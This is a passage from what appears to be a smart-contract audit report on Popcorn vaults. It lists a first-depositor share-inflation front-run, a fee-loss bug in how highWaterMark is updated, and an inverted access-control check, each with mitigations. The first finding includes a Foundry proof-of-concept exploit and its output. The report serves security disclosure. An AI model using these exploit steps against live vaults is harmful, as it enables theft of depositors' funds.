+Alice wants to deposit 2MM USDT to a vault.Bob frontruns Alice deposit() call with the following transactions:vault.deposit(1, bob): This gives Bob 1 share backed by 1 USDT.usdt.transfer(address(vault.adapter()), 1MM): Sends 1MM USDT to the underlying vault’s adapter (from were thetotalAssetsare calculated)After those two transactions,totalAssets = 1MM + 1andtotalSupply = 1.Alice deposit transaction is mined:deposit(2MM, alice), she receives onlyoneshare because:2MM / (1MM + 1) * totalSupply = 2MM / (1MM + 1) * 1 = 2MM / (1MM+) ≈ 1.999998 = 1 (as Solidity floors down).After Alice tx, the pool now has 3MM assets and distributed 2 shares.Bob backruns Alice’s transaction and redeems his share getting 3MM * (1 Share Owned by Bob) / (2 total shares) = 1.5MM
+This process gives Bob a ≈500k asset profit and Alice incurs a ≈500k loss:
+functiontest__FirstDepositorFrontRun()public{uint256amount=2_000_000ether;uint256aliceassetAmount=amount;asset.mint(bob,aliceassetAmount);asset.mint(alice,aliceassetAmount);vm.prank(alice);asset.approve(address(vault),aliceassetAmount);assertEq(asset.allowance(alice,address(vault)),aliceassetAmount);vm.prank(bob);asset.approve(address(vault),aliceassetAmount);assertEq(asset.allowance(bob,address(vault)),aliceassetAmount);uint256alicePreDepositBal=asset.balanceOf(alice);console.log("\n=== INITIAL STATES ===");console.log("Bob assets: %s",asset.balanceOf(bob));console.log("Alice assets: %s",alicePreDepositBal);// Bob frontruns Alice deposit.vm.startPrank(bob);uint256bobShareAmount=vault.deposit(1,bob);console.log("\n=== BOB DEPOSITS ===");console.log("Bob Shares Amount: %s",bobShareAmount);console.log("Vault Assets : %s",vault.totalAssets());assertTrue(bobShareAmount==1);assertTrue(vault.totalAssets() ==1);assertEq(adapter.afterDepositHookCalledCounter(),1);// Bob transfers 1MM of tokens to the adapterasset.transfer(address(vault.adapter()),1_000_000ether);console.log("\n=== AFTER BOB's TRANSFER ===");console.log("Bob Shares Amount: %s",bobShareAmount);console.log("Vault Assets : %s",vault.totalAssets());assertTrue(vault.totalAssets() ==1_000_000ether+1);vm.stopPrank();// Alice Txn is minedvm.prank(alice);uint256aliceShareAmount=vault.deposit(aliceassetAmount,alice);console.log("\n=== AFTER ALICE TX ===");console.log("Alice Shares Amount: %s",aliceShareAmount);console.log("Vault Assets : %s",vault.totalAssets());assertTrue(aliceShareAmount==1);console.log("Convertable assets that Bob receives: %s",vault.convertToAssets(vault.balanceOf(bob)));console.log("Convertable assets that Alice receives: %s",vault.convertToAssets(vault.balanceOf(bob)));// Bob backruns the call and gets a 500k profitvm.prank(bob);vault.redeem(bobShareAmount,bob,bob);console.log("\n=== BOB WITHDRAWS ===");console.log("\n=== ALICE WITHDRAWS ===");vm.prank(alice);vault.redeem(aliceShareAmount,alice,alice);console.log("\n=== FINAL STATES ===");console.log("Bob assets: %s",asset.balanceOf(bob));console.log("Alice assets: %s",asset.balanceOf(alice));}
+Output:
+=== INITIAL STATES ===Bob assets: 2000000000000000000000000Alice assets: 2000000000000000000000000=== BOB DEPOSITS ===Bob Shares Amount: 1Vault Assets : 1=== AFTER BOB's TRANSFER ===Bob Shares Amount: 1Vault Assets : 1000000000000000000000001=== AFTER ALICE TX ===Alice Shares Amount: 1Vault Assets : 3000000000000000000000001Convertable assets that Bob receives: 1500000000000000000000000Convertable assets that Alice receives: 1500000000000000000000000=== BOB WITHDRAWS ====== ALICE WITHDRAWS ====== FINAL STATES ===Bob assets: 2499999999999999999999999Alice assets: 1500000000000000000000001
+This same issue is commonly found in vaults.Spearbitalsoreported thison their Maple V2 audit as the primary high risk issue.
+Recommended Mitigation Steps
+Require a minimum amount of initial shares (when its supply is zero) to be minted taking into account that:The deposit mints an effective (INITIALMINT - INITIALBURN) amount of shares to the first depositorBurns the INITIAL_BURN amount to a dead address.
+Both initial amounts should be set carefully as they partially harm the first depositor. Those amounts should be high enough to reduce the profitability of this attack to the first depositor but not excessively high which could reduce the incentive of being the first depositor.
+RedVeil (Popcorn) confirmed
+
+[H-11] Protocol loses fees because highWaterMark is updated every time someone deposit, withdraw, mint
+Submitted byrvierdiiev, also found bypeakbolt
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L138
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L215
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L480-L499
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460
+Impact
+Protocol loses fees because highWaterMark is updated every time someone deposit, withdraw, mint.
+Proof of Concept
+This bug is related to the fees accruing design. It was discussed with the sponsor in order to understand how it should work.
+Protocol has such thing as performance fee. Actually this is fee from accrued yields. If user deposited X assets and after some time he can withdraw X+Y assets for that minted amount of shares, that means that strategy has earned some Y amount of yields. Then protocol is able to get some part of that Y amount as a performance fee.
+takeFeesmodifieris responsible for taking fees.
+It callsaccruedPerformanceFeefunction to calculate fees amount.
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L447-L460
+functionaccruedPerformanceFee()publicviewreturns(uint256) {uint256highWaterMark_=highWaterMark;uint256shareValue=convertToAssets(1e18);uint256performanceFee=fees.performance;returnperformanceFee>0&&shareValue>highWaterMark?performanceFee.mulDiv((shareValue-highWaterMark) *totalSupply(),1e36,Math.Rounding.Down):0;}
+As you can see, protocol has such variable ashighWaterMark. This variable actually should storeconvertToAssets(1e18)amount at the time when last fee were accrued or after first deposit.
+Then after some time when strategy earned some yields,convertToAssets(1e18)will return more assets thanhighWaterMark, so protocol will take fees.
+But currently updating ofhighWaterMarkis done incorrectly.
+Deposit, mint, withdraw functionusesyncFeeCheckpointmodifier.
+https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/Vault.sol#L496-L499
+modifiersyncFeeCheckpoint() {_;highWaterMark=convertToAssets(1e18);}
+This modifier will updatehighWaterMarkto current assets amount that you can receive for 1e18 of shares.
+That means that every time when deposit, mint, withdraw is called,highWaterMarkis updated to the new state, so protocol doesn’t track yield progress anymore.
+In case if protocol accrued some performance fees, which can be possible if noone called deposit, withdraw, mint for a long time, then anyone can frontruntakeFeesand deposit small amount of assets in order to updatehighWaterMark, so protocol will not get any fees.
+Tools Used
+VS Code
+Recommended Mitigation Steps
+I believe that you need to storehighWaterMark = convertToAssets(1e18)at the time of first deposit, or when totalShares is 0, this will be the value that protocol started with and then at time, when takefee was called you can calculate current convertToAssets(1e18) in case if it’s bigger, than previous stored, then you can mint fees for protocol and update highWaterMark to current value.
+RedVeil (Popcorn) confirmed
+
+[H-12] Modifier VaultController._verifyCreatorOrOwner does not work as intented
+Submitted byustas, also found byokkothejawa,Ada,bin2chen,pwnforce,mert_eren,ktg,0xRobocop,georgits,gjaldon, andhashminer0725
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L666-L670
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L448
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L608
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L621
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L634
+https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/vault/VaultController.sol#L647
+Impact
+ModifierVaultController._verifyCreatorOrOwnerdoes not work. Instead of checking the conditionmsg.sender is creator OR owner, it makesmsg.sender is creator AND owner. This would block access to all created Vaults for creators and the owner (if he did not create them).
+Specifically, the following functions in theVaultControllerare affected:
+addStakingRewardsTokens();deployVault(), which has a call toaddStakingRewardsTokens(), cannot be executed if the argumentrewardsData.length != 0;pauseAdapters();pauseVaults();unpauseAdapters();unpauseVaults().
+Proof of Concept
+To check this concept, we can make a truth table for the main condition in the modifiermsg.sender != metadata.creator || msg.sender != owner. The table shows that the condition will equalfalseonly in the one case wheremsg.senderis both creator and owner.
+msg.sender != metadata.creatormsg.sender != ownermsg.sender != metadata.creator || msg.sender != owner000011101111
+The correct condition should be the following:msg.sender != metadata.creator && msg.sender != owner.
+msg.sender != metadata.creatormsg.sender != ownermsg.sender != metadata.creator && msg.sender != owner000010100111
+In this case, a revert will only happen whenmsg.senderis neither a creator nor the owner, as it should be according to the documentation.
+You can also use the following test to check; add it to the filetest\vault\VaultController.t.sol:
+functiontestFail__deployVault_creator_is_not_owner_audit()public{addTemplate("Adapter",templateId,adapterImpl,true,true);addTemplate("Strategy","MockStrategy",strategyImpl,false,true);addTemplate("Vault","V1",vaultImpl,true,true);controller.setPerformanceFee(uint256(1000));controller.setHarvestCooldown(1days);rewardToken.mint(bob,10ether);rewardToken.approve(address(controller),10ether);swapTokenAddresses[0] =address(0x9999);addressadapterClone=0xD6C5fA22BBE89db86245e111044a880213b35705;addressstrategyClone=0xe8a41C57AB0019c403D35e8D54f2921BaE21Ed66;addressstakingClone=0xE64C695617819cE724c1d35a37BCcFbF5586F752;uint256callTimestamp=block.timestamp;vm.prank(bob);addressvaultClone=controller.deployVault(VaultInitParams({asset:iAsset,adapter:IERC4626(address(0)),fees:VaultFees({deposit:100,withdrawal:200,management:300,performance:400}),feeRecipient:feeRecipient,owner:bob}),DeploymentArgs({id:templateId,data:abi.encode(uint256(100))}),DeploymentArgs({id:"MockStrategy",data:""}),address(0),abi.encode(address(rewardToken),0.1ether,1ether,true,10000000,2days,1days),VaultMetadata({vault:address(0),staking:address(0),creator:bob,metadataCID:metadataCid,swapTokenAddresses:swapTokenAddresses,swapAddress:address(0x5555),exchange:uint256(1)}),0);}
+In the test’s log (forge test --match-test "testFail__deployVault_creator_is_not_owner" -vvvv), you can see that the call ended with revertNotSubmitterNorOwner(0x000000000000000000000000000000000000000000000000DCbA).
+Tools Used
+VSCodium, Forge
+Recommended Mitigation Steps
+Change the condition tomsg.sender != metadata.creator && msg.sender != owner.
+RedVeil (Popcorn) confirmed, but disagreed with severity
+
